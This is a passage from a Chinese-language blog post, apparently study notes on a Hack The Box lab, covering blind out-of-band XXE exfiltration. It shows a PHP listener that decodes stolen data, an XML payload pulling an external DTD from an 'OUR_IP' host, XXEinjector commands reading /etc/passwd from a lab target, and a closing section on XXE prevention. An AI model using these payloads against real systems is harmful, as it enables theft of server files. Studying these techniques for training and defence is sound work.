href="http://our_ip:8000/?content=WFhFX1NBTVBMRV9EQVRB.%E6%9C%80%E5%90%8E%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%AF%B9WFhFX1NBTVBMRV9EQVRB%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82%E6%88%91%E4%BB%AC%E7%94%9A%E8%87%B3%E5%8F%AF%E4%BB%A5%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PHP%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E7%BC%96%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%BE%93%E5%87%BA%E5%88%B0%E7%BB%88%E7%AB%AF%EF%BC%9A">http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB.最后，我们可以对WFhFX1NBTVBMRV9EQVRB字符串进行解码，以获得文件的内容。我们甚至可以编写一个简单的PHP脚本，自动检测编码的文件内容，对其进行解码，并将其输出到终端：</a></p>
+<pre><code class="php">&lt;?php
+if(isset($_GET[&#39;content&#39;]))&#123;
+    error_log(&quot;\n\n&quot; . base64_decode($_GET[&#39;content&#39;]));
+&#125;
+?&gt;
+</code></pre>
+<p>因此，我们将首先将上面的PHP代码写入index.PHP，然后在8000端口上启动一个PHP服务器，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ vi index.php # here we write the above PHP code
+Tanin@htb[/htb]$ php -S 0.0.0.0:8000
+
+PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+</code></pre>
+<p>现在，为了启动我们的攻击，我们可以使用与基于错误的攻击中使用的负载类似的负载，只需添加<root>&amp;content</root>，它需要引用我们的实体，并让它向我们的机器发送带有文件内容的请求：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE email [ 
+  &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;
+  %remote;
+  %oob;
+]&gt;
+&lt;root&gt;&amp;content;&lt;/root&gt;
+</code></pre>
+<p>然后，我们可以将请求发送到web应用程序：</p>
+<p>最后，我们可以回到我们的终端，我们将看到我们确实得到了请求及其解码内容：</p>
+<pre><code class="shell-session">PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+10.10.14.16:46256 Accepted
+10.10.14.16:46256 [200]: (null) /xxe.dtd
+10.10.14.16:46256 Closing
+10.10.14.16:46258 Accepted
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...SNIP...
+</code></pre>
+<p>提示：除了将base64编码的数据存储为URL的参数外，我们还可以使用DNS OOB Exfiltering，将编码的数据作为URL的子域（例如ENCODEDTEXT.our.website.com），然后使用tcpdump等工具捕获任何传入流量并解码子域字符串以获取数据。诚然，这种方法更先进，需要付出更多的努力来过滤数据。</p>
+<h2 id="Automated-OOB-Exfiltration"><a href="#Automated-OOB-Exfiltration" class="headerlink" title="Automated OOB Exfiltration"></a>Automated OOB Exfiltration</h2><p>尽管在某些情况下，我们可能不得不使用上面学到的手动方法，但在许多其他情况下，可以使用工具自动化盲XXE数据的过滤过程。 <a target="_blank" rel="noopener" href="https://github.com/enjoiz/XXEinjector">XXEinjector</a>就是这样一个工具。该工具支持我们在本模块中学到的大多数技巧，包括基本XXE、CDATA源exfiltering、基于错误的XXE和盲目OOB XXE。 要使用此工具进行OOB自动过滤，我们可以首先将该工具克隆到我们的机器上，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git
+
+Cloning into &#39;XXEinjector&#39;...
+...SNIP...
+</code></pre>
+<p>一旦我们有了这个工具，我们就可以从Burp复制HTTP请求，并将其写入一个文件供工具使用。我们不应该包括完整的XML数据，只包括第一行，并在它后面写XXEINJECT作为工具的位置定位器：</p>
+<pre><code class="http">POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+XXEINJECT
+</code></pre>
+<p>现在，我们可以运行该工具，–host&#x2F;-httpport标志是我们的IP和端口，–file标志是我们上面写的文件，–path标志是我们想要读取的文件。我们还将选择–oob&#x3D;http和–phpfilter标志来重复我们上面所做的oob攻击，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+...SNIP...
+[+] Sending request with malicious XML.
+[+] Responding with XML for: /etc/passwd
+[+] Retrieved data:
+</code></pre>
+<p>我们看到该工具没有直接打印数据。这是因为我们对数据进行base64编码，所以它不会被打印出来。在任何情况下，所有经过过滤的文件都会存储在该工具下的Logs文件夹中，我们可以在那里找到我们的文件：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...SNIP..
+</code></pre>
+<h1 id="XXE-Prevention"><a href="#XXE-Prevention" class="headerlink" title="XXE Prevention"></a>XXE Prevention</h1><p>除了使用最新的XML库之外，web应用程序的某些XML配置还有助于降低XXE被利用的可能性。其中包括： </p>
+<p>禁用引用自定义文档类型定义（DTD） </p>
+<p>禁用引用外部XML实体 禁用参数实体处理 禁用对XInclude的支持</p>
+<p> 防止实体引用循环 </p>
+<p>我们看到的另一件事是基于错误的XXE利用。因此，我们应该在web应用程序中始终有适当的异常处理，并且应该始终禁用在web服务器中显示运行时错误。 如果我们错过了更新某些XML库，这样的配置应该是另一层保护，并且还应该防止XXE被利用。然而，在这种情况下，我们可能仍然使用易受攻击的库，并且只应用防止利用的变通方法，这并不理想。 由于XML数据引入了各种问题和漏洞，许多人还建议使用其他格式，如JSON或YAML。这还包括避免使用依赖XML（例如SOAP）的API标准，而使用基于JSON的API（例如REST）。 最后，使用Web应用程序防火墙（WAF）是防止XXE利用的另一层保护措施。然而，我们永远不应该完全依赖WAF，让后端变得脆弱，因为WAF总是可以绕过的。</p>
 </article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2023/09/06/Web-Attacks-IDOR/" title="Web Attacks-IDOR"><span class="has-text-weight-semibold">Next: Web Attacks-IDOR</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
